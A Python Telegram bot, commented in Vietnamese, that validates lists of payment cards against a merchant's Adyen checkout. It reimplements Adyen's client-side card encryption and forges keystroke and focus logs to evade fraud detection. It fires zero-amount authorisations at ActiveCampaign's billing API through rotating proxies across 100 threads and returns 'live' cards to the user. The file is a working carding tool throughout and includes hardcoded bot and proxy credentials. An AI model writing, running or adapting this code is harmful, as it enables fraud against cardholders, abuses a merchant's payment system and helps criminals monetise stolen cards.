import os
import json
import hmac
import hashlib
import base64
import re
import string
import random
import sys
import time
import uuid
import threading
import queue
import io
import asyncio
import psutil
from datetime import datetime

# Thư viện Crypto
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from Cryptodome.Util.Padding import pad
from jose import jwk

# Thư viện Request
import pycurl

# Thư viện Telegram Bot
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# ===================================================================
# === CẤU HÌNH BOT
# ===================================================================
BOT_TOKEN = "8110946929:AAGFn8gap9gMHH4_pABitcNd-saTGl24g0I"  # <--- THAY TOKEN CỦA BẠN VÀO ĐÂY
ALLOWED_CHAT_ID = None  # Nếu muốn chỉ mình bạn dùng, điền Chat ID vào đây (dạng số), ví dụ: 123456789

# Global lock
print_lock = threading.Lock()

# ===================================================================
# === PHẦN 1: CÁC HÀM VALIDATION & CRYPTO (GIỮ NGUYÊN LOGIC CŨ)
# ===================================================================

def normalize_card(card_str):
    pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
    match = re.search(pattern, card_str)
    if not match:
        return None
    card_num, month, year, cvv = match.groups()
    month_int = int(month)
    if month_int < 1 or month_int > 12: return None
    month = month.zfill(2)
    if len(year) == 2: year = '20' + year
    year_int = int(year)
    if year_int < 2000 or year_int > 2099: return None
    return f"{card_num}|{month}|{year}|{cvv}"

def validate_luhn(card_number):
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19: return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9: n = n - 9
        total += n
    return total % 10 == 0

def get_short_brand_name(cc):
    first_digit = cc[0]
    if first_digit in ['5', '2']: return 'mc'
    elif first_digit == '4': return 'visa'
    elif cc.startswith('34') or cc.startswith('37'): return 'amex'
    elif cc.startswith('60') or cc.startswith('64') or cc.startswith('65'): return 'discover'
    elif cc.startswith('62'): return 'cup'
    elif cc.startswith('35'): return 'jcb'
    elif cc.startswith('30') or cc.startswith('36') or cc.startswith('38'): return 'diners'
    elif cc.startswith('67'): return 'maestro'
    else: return 'unknown'

def get_current_timestamp():
    return datetime.utcnow().isoformat() + 'Z'

def generate_fake_log(input_len):
    log_entries = []
    current_time = random.randint(2000, 5000)
    log_entries.append(f"fo@{current_time}")
    current_time += random.randint(50, 200)
    log_entries.append(f"cl@{current_time}")
    current_time += random.randint(100, 300)
    for _ in range(input_len):
        log_entries.append(f"KN@{current_time}")
        current_time += random.randint(60, 180)
    return ",".join(log_entries)

def w(e):
    t = e
    if isinstance(t, str): t = t.encode('utf-8')
    return base64.b64encode(t).decode('utf-8')

def _(e):
    return w(e).replace('=', '').replace('+', '-').replace('/', '_')

def k(e):
    if not e: return bytearray(0)
    if len(e) % 2 == 1: e = "0" + e
    t = len(e) // 2
    r = bytearray(t)
    for n in range(t): r[n] = int(e[n*2:n*2+2], 16)
    return r

bt = 2**32
def mt(e, t, r):
    if not (0 <= t < bt): raise ValueError(f"value must be >= 0 and <= {bt - 1}. Received {t}")
    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]

class AdyenV4_8_0:
    def __init__(self, site_key):
        self.site_key = site_key
        self.key_object = None

    def generate_key(self):
        parts = self.site_key.split("|")
        part1, part2 = parts[0], parts[1]
        decoded_part1, decoded_part2 = k(part1), k(part2)
        encoded_part1, encoded_part2 = _(decoded_part1), _(decoded_part2)
        self.key_object = {"kty": "RSA", "kid": "asf-key", "e": encoded_part1, "n": encoded_part2, "alg": "RSA-OAEP"}
        return self.key_object

    def encrypt_data(self, plain_text):
        public_key = jwk.construct(self.key_object)
        pem = public_key.to_pem().decode('utf-8')
        rsa_key = RSA.import_key(pem)
        random_bytes = os.urandom(64)
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_key = cipher_rsa.encrypt(random_bytes)
        cek = random_bytes
        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
        _iv = os.urandom(16)
        _plaintext = json.dumps(plain_text).encode('utf-8')
        aes_key, hmac_key = cek[32:], cek[:32]
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
        padded_plaintext = pad(_plaintext, AES.block_size)
        ciphertext = cipher_aes.encrypt(padded_plaintext)
        protected_header2_bytes = protected_header_b64.encode('utf-8')
        f = len(protected_header2_bytes) * 8
        d, h_val = f // bt, f % bt
        y = bytearray(8)
        mt(y, d, 0)
        mt(y, h_val, 4)
        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
        tag = hmac_obj.digest()[:32]
        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"

def format_card_number(card):
    return ' '.join(card[i:i+4] for i in range(0, len(card), 4))

def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
    if not stripe_key: stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
    if not domain: domain = "https://www.mytheresa.com"
    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.0/securedFields.html?type=card&d={domain_b64}"
    card_number = format_card_number(card)
    card_detail = {
        "encryptedCardNumber": {"number": card_number, "generationtime": get_current_timestamp(), "numberBind": "1", "activate": "3", "referrer": referrer, "numberFieldFocusCount": "1", "numberFieldLog": generate_fake_log(16), "numberFieldClickCount": "1", "numberFieldKeyCount": "16"},
        "encryptedExpiryMonth": {"expiryMonth": month, "generationtime": get_current_timestamp()},
        "encryptedExpiryYear": {"expiryYear": year, "generationtime": get_current_timestamp()},
        "encryptedSecurityCode": {"cvc": cvc, "generationtime": get_current_timestamp(), "cvcBind": "1", "activate": "4", "referrer": referrer, "cvcFieldFocusCount": "1", "cvcFieldLog": generate_fake_log(3), "cvcFieldClickCount": "1", "cvcFieldKeyCount": "3", "cvcFieldChangeCount": "1", "cvcFieldBlurCount": "1", "deactivate": "2"}
    }
    adyen_encryptor = AdyenV4_8_0(adyen_key)
    adyen_encryptor.generate_key()
    encrypted_details = {}
    for key, value in card_detail.items():
        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
    return encrypted_details

def generate_browser_profile():
    chrome_version = random.randint(120, 131)
    return {
        "user_agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        "sec_ch_ua": f'"Not_A Brand";v="8", "Chromium";v="{chrome_version}", "Google Chrome";v="{chrome_version}"',
        "platform": '"Windows"'
    }

def generate_checkout_attempt_id():
    uuid_part = str(uuid.uuid4())
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=50))
    return f"{uuid_part}{suffix}"

# ===================================================================
# === PHẦN 2: HÀM CHECK THẺ (CORE LOGIC)
# ===================================================================

def check_one_card(cc, mm, yyyy, cvc):
    start_time_counter = time.time()
    
    ADYEN_PUB_KEY = "10001|C740E51C2E7CEDAFC96AA470E575907B40E84E861C8AB2F4952423F704ABC29255A37C24DED6068F7D1E394100DAD0636A8362FC1A5AAE658BB9DA4262676D3BFFE126D0DF11C874DB9C361A286005280AD45C06876395FB60977C25BED6969A3A586CD95A3BE5BE2016A56A5FEA4287C9B4CAB685A243CFA04DC5C115E11C2473B5EDC595D3B97653C0EA42CB949ECDEA6BC60DC9EDF89154811B5E5EBF57FDC86B7949BA300F679716F67378361FF88E33E012F31DB8A14B00C3A3C2698D2CA6D3ECD9AE16056EE8E13DFFE2C99E1135BBFCE4718822AB8EA74BEBA4B1B99BBE43F2A6CC70882B6E5E1A917F8264180BE6CD7956967B9D8429BF9C0808004F"
    STRIPE_KEY = "live_CFDMTKEQ6RE5FPLXYTYYUGWJBUCBUWI7"
    TARGET_DOMAIN = "https://www.activecampaign.com"

    max_retries = 20
    current_try = 0
    success_request = False
    data = {}
    
    result_dict = {
        "status": "ERROR",
        "msg": "Unknown",
        "full_str": "",
        "time_taken": 0.0
    }

    while current_try < max_retries:
        try:
            encrypted_result = encrypt_card_data_480(cc, mm, yyyy, cvc, ADYEN_PUB_KEY, STRIPE_KEY, TARGET_DOMAIN)
            profile = generate_browser_profile()
            email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
            city = 'New York'
            telephoneNumber = ''.join(random.choices(string.digits, k=10))
            name = ''.join(random.choices(string.ascii_letters + ' ', k=10)).strip()
            attempt_id = generate_checkout_attempt_id()

            headers_list = [
                'accept: application/json, text/plain, */*',
                'accept-language: en-US,en;q=0.9',
                'cache-control: no-cache',
                'content-type: application/json',
                f'user-agent: {profile["user_agent"]}',
                f'sec-ch-ua: {profile["sec_ch_ua"]}',
                'sec-ch-ua-mobile: ?0',
                f'sec-ch-ua-platform: {profile["platform"]}',
                'origin: https://www.activecampaign.com',
                'pragma: no-cache',
                'referer: https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
                'sec-fetch-dest: empty', 'sec-fetch-mode: cors', 'sec-fetch-site: same-origin',
            ]

            json_data = {
                'paymentMethod': {
                    'type': 'scheme', 'holderName': name,
                    'encryptedCardNumber': encrypted_result['encryptedCardNumber'],
                    'encryptedExpiryMonth': encrypted_result['encryptedExpiryMonth'],
                    'encryptedExpiryYear': encrypted_result['encryptedExpiryYear'],
                    'encryptedSecurityCode': encrypted_result['encryptedSecurityCode'],
                    'brand': get_short_brand_name(cc),
                    'checkoutAttemptId': attempt_id,
                },
                'shopperEmail': email, 'shopperName': name,
                'billingAddress': {'city': city, 'country': 'US', 'houseNumberOrName': '123', 'postalCode': '10001', 'stateOrProvince': 'NY', 'street': 'Broadway'},
                'telephoneNumber': telephoneNumber,
                'amount': {'value': 0, 'currency': 'USD'},
                'returnUrl': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
            }

            post_body = json.dumps(json_data).encode('utf-8')
            buffer = io.BytesIO()
            c = pycurl.Curl()
            c.setopt(pycurl.URL, 'https://www.activecampaign.com/api/billing/adyen/payments')
            c.setopt(pycurl.POST, 1)
            c.setopt(pycurl.POSTFIELDS, post_body)
            c.setopt(pycurl.HTTPHEADER, headers_list)
            
            # PROXY LOGIC
            session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            proxy_url = "http://aus.360s5.com:3600"
            base_auth = "88634867-zone-custom"
            pass_auth = "AetOKcLB"
            proxy_auth = f"{base_auth}-session-{session_id}:{pass_auth}"
            c.setopt(pycurl.PROXY, proxy_url)
            c.setopt(pycurl.PROXYUSERPWD, proxy_auth)
            
            c.setopt(pycurl.SSL_VERIFYPEER, 0)
            c.setopt(pycurl.SSL_VERIFYHOST, 0)
            c.setopt(pycurl.TIMEOUT, 30)
            c.setopt(pycurl.WRITEDATA, buffer)

            c.perform()
            c.close()

            response_text = buffer.getvalue().decode('utf-8')
            data = json.loads(response_text)
            success_request = True
            break
        except Exception:
            current_try += 1
            time.sleep(1)

    time_taken = round(time.time() - start_time_counter, 2)
    result_dict["time_taken"] = time_taken

    if not success_request:
        result_dict["status"] = "ERROR"
        result_dict["msg"] = "Network Fail/Max Retries"
        result_dict["full_str"] = f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|NETWORK_FAIL|{time_taken}s"
        return result_dict

    # Phân tích kết quả
    additionalData = data.get('additionalData', {})
    cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
    cvcResult = additionalData.get('cvcResult', 'N/A')
    avsResultRaw = additionalData.get('avsResultRaw', 'N/A')
    avsResult = additionalData.get('avsResult', 'N/A')
    refusalReasonRaw = additionalData.get('refusalReasonRaw', 'N/A')
    refusalReason = data.get('refusalReason', additionalData.get('refusalReason', 'N/A'))
    resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
    message = data.get('message', 'N/A')

    status = "DIE"
    msg = f"UNK - {message if message != 'N/A' else resultCode}"
    
    if resultCode == "Authorised" or resultCode == "Cancelled":
        status = "LIVE"
        msg = "APPROVED ✅"
    elif resultCode == "Refused":
        status = "DIE"
        msg = f"DIE - {refusalReason}"
    elif resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
        status = "DIE" # Coi như die nếu dính 3D
        msg = "3DS - 3D Secure required"
    else:
        status = "DIE"
        msg = f"UNK - {message if message != 'N/A' else resultCode}"

    result_string = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg}|Time: {time_taken}s"
    
    result_dict["status"] = status
    result_dict["msg"] = msg
    result_dict["full_str"] = result_string
    return result_dict

# ===================================================================
# === PHẦN 3: LOGIC BOT & WORKER MANAGER
# ===================================================================

class BotSession:
    def __init__(self, chat_id, total_cards):
        self.chat_id = chat_id
        self.total = total_cards
        self.checked = 0
        self.live = 0
        self.die = 0
        self.error = 0
        self.start_time = time.time()
        self.is_running = True
        self.live_list = []
        self.die_list = []

# Global dictionary to store sessions: chat_id -> Session
active_sessions = {}

def worker_thread(q, session):
    while True:
        try:
            line = q.get(timeout=1) # Timeout để thread có thể thoát nếu queue rỗng
        except queue.Empty:
            break
            
        if line is None: break
        
        normalized = normalize_card(line)
        if not normalized or not validate_luhn(normalized.split('|')[0]):
            session.error += 1
            session.checked += 1
            q.task_done()
            continue

        cc, mm, yyyy, cvc = normalized.split('|')
        res = check_one_card(cc, mm, yyyy, cvc)
        
        if res["status"] == "LIVE":
            session.live += 1
            session.live_list.append(res["full_str"])
        elif res["status"] == "DIE":
            session.die += 1
            session.die_list.append(res["full_str"])
        else:
            session.error += 1
            
        session.checked += 1
        q.task_done()

async def status_updater(update: Update, context: ContextTypes.DEFAULT_TYPE, session: BotSession, message_id):
    """Cập nhật tin nhắn trạng thái mỗi giây"""
    last_text = ""
    while session.checked < session.total and session.is_running:
        elapsed = time.time() - session.start_time
        if elapsed == 0: elapsed = 1
        cpm = int((session.checked / elapsed) * 60)
        
        cpu_usage = psutil.cpu_percent()
        ram_usage = psutil.virtual_memory().percent
        
        # Thanh tiến trình
        percent = int((session.checked / session.total) * 100)
        filled = int(percent / 10)
        bar = "█" * filled + "░" * (10 - filled)
        
        text = (
            f"🚀 <b>Checking Progress...</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total: {session.total}\n"
            f"✅ Live: {session.live}\n"
            f"❌ Die: {session.die}\n"
            f"⚠️ Error: {session.error}\n"
            f"🔁 Tested: {session.checked}/{session.total} ({percent}%)\n"
            f"[{bar}]\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"⚡ CPM: {cpm}\n"
            f"🖥 CPU: {cpu_usage}% | RAM: {ram_usage}%\n"
            f"⏱ Time: {int(elapsed)}s"
        )
        
        if text != last_text:
            try:
                await context.bot.edit_message_text(
                    chat_id=session.chat_id,
                    message_id=message_id,
                    text=text,
                    parse_mode="HTML"
                )
                last_text = text
            except Exception:
                pass # Bỏ qua lỗi flood wait hoặc lỗi mạng nhỏ
        
        await asyncio.sleep(1.5) # Update mỗi 1.5s để tránh limit

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    if ALLOWED_CHAT_ID and chat_id != ALLOWED_CHAT_ID:
        return

    file = await update.message.document.get_file()
    
    # Download file vào RAM
    file_content = io.BytesIO()
    await file.download_to_memory(file_content)
    file_content.seek(0)
    
    lines = [line.decode('utf-8', errors='ignore').strip() for line in file_content.readlines() if line.strip()]
    total_cards = len(lines)
    
    if total_cards == 0:
        await update.message.reply_text("File rỗng!")
        return

    msg = await update.message.reply_text(f"⏳ Đang khởi tạo 100 luồng check {total_cards} thẻ...")
    
    # Tạo Session
    session = BotSession(chat_id, total_cards)
    active_sessions[chat_id] = session
    
    # Tạo Queue và Thread
    q = queue.Queue()
    for line in lines:
        q.put(line)
        
    threads = []
    # FIX: Chạy 100 Thread như yêu cầu
    for _ in range(100):
        t = threading.Thread(target=worker_thread, args=(q, session))
        t.daemon = True
        t.start()
        threads.append(t)
        
    # Chạy Status Updater (Async task)
    updater_task = asyncio.create_task(status_updater(update, context, session, msg.message_id))
    
    # Chờ Queue xong trong một thread riêng để không block bot
    def wait_for_completion():
        q.join()
        session.is_running = False
        
    await asyncio.to_thread(wait_for_completion)
    await updater_task # Đợi updater dừng hẳn
    
    # Gửi kết quả cuối cùng
    elapsed = time.time() - session.start_time
    final_text = (
        f"✅ <b>DONE!</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Live: {session.live} | Die: {session.die} | Total: {session.total}\n"
        f"Time taken: {int(elapsed)}s"
    )
    await context.bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=final_text, parse_mode="HTML")
    
    # Gửi file Live/Die
    if session.live_list:
        live_data = "\n".join(session.live_list).encode('utf-8')
        await context.bot.send_document(
            chat_id=chat_id,
            document=InputFile(io.BytesIO(live_data), filename=f"Live_{int(time.time())}.txt"),
            caption=f"Live Cards: {len(session.live_list)}"
        )
    
    if session.die_list:
        die_data = "\n".join(session.die_list).encode('utf-8')
        await context.bot.send_document(
            chat_id=chat_id,
            document=InputFile(io.BytesIO(die_data), filename=f"Die_{int(time.time())}.txt"),
            caption=f"Die Cards: {len(session.die_list)}"
        )

    # Cleanup
    del active_sessions[chat_id]

async def handle_single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý lệnh /st cc|mm|yy|cvv"""
    chat_id = update.effective_chat.id
    if ALLOWED_CHAT_ID and chat_id != ALLOWED_CHAT_ID: return

    args = context.args
    if not args:
        await update.message.reply_text("⚠️ Cách dùng: /st 400000|01|2026|123")
        return
    
    input_str = args[0]
    normalized = normalize_card(input_str)
    
    if not normalized:
        await update.message.reply_text("⚠️ Định dạng thẻ sai hoặc ngày tháng không hợp lệ.")
        return

    msg = await update.message.reply_text(f"🔄 Checking {normalized}...")
    
    cc, mm, yyyy, cvc = normalized.split('|')
    
    # Chạy hàm check trong thread riêng để không block
    res = await asyncio.to_thread(check_one_card, cc, mm, yyyy, cvc)
    
    if res["status"] == "LIVE":
        icon = "✅ APPROVED"
    else:
        icon = "❌ DECLINED"
        
    reply_text = (
        f"<b>{icon}</b>\n"
        f"<code>{res['full_str']}</code>\n"
        f"Gateway: Adyen v4.8.0\n"
        f"Time: {res['time_taken']}s"
    )
    
    await context.bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=reply_text, parse_mode="HTML")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Chào! Tôi là Bot Adyen Checker (Ubuntu Version).\n\n"
        "1. Gửi file .txt chứa thẻ để check (100 Threads).\n"
        "2. Dùng lệnh <code>/st cc|mm|yy|cvv</code> để check lẻ.",
        parse_mode="HTML"
    )

# ===================================================================
# === MAIN FUNCTION
# ===================================================================

def run_bot():
    if BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN":
        print("LỖI: Chưa cấu hình BOT_TOKEN trong code!")
        return

    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("st", handle_single_check))
    application.add_handler(MessageHandler(filters.Document.MimeType("text/plain"), handle_document))
    
    print("Bot đang chạy trên Ubuntu...")
    application.run_polling()

if __name__ == '__main__':
    run_bot()
